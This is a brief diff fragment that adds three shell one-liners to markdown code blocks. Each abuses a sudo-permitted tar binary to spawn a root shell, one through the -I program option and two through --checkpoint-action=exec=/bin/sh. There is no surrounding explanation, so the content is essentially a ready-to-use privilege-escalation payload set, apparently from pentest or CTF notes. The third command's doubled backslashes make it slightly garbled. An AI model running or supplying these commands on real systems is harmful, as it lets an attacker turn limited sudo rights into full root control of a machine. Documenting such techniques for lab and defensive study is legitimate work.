@@ -1,13 +1,13 @@
 ```
-
+sudo /usr/bin/tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
 ```
 
 ```
-
+sudo /usr/bin/tar -czvf /tmp/backup.tar.gz /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
 ```
-
+sudo /usr/bin/tar -czvf /tmp/backup.tar.gz /dev/null \\  --checkpoint=1 \\  --checkpoint-action=exec=/bin/sh
 ```
 
 ```
